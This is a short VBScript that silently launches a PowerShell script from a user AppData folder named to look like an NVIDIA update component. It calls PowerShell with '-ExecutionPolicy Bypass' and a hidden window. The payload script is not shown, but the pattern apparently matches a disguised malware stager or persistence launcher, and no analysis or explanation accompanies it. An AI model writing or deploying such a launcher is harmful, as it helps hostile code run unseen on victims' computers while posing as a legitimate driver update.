Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -ExecutionPolicy Bypass -File ""%appdata%\nvidia_sys\logs\nvs_update.ps1""", 0, True
